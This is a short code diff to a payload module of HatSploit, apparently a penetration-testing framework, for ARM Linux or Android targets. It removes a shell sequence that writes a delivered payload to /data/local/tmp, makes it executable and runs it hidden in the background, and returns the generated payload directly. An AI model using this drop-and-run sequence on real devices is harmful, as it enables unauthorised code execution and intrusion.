@@ -108,13 +108,4 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient, StringTools):
         self.output_process("Generating payload...")
         payload = self.generate(executable_format, 'armle', shellcode)
 
-        filename = self.random_string()
-
-        instructions = ""
-        instructions += f"cat >/data/local/tmp/{filename};"
-        instructions += f"chmod 777 /data/local/tmp/{filename};"
-        instructions += f"sh -c '/data/local/tmp/{filename}' 2>/dev/null &"
-        instructions += "\n"
-
-        self.payload = payload
-        self.instructions = instructions
+        return payload
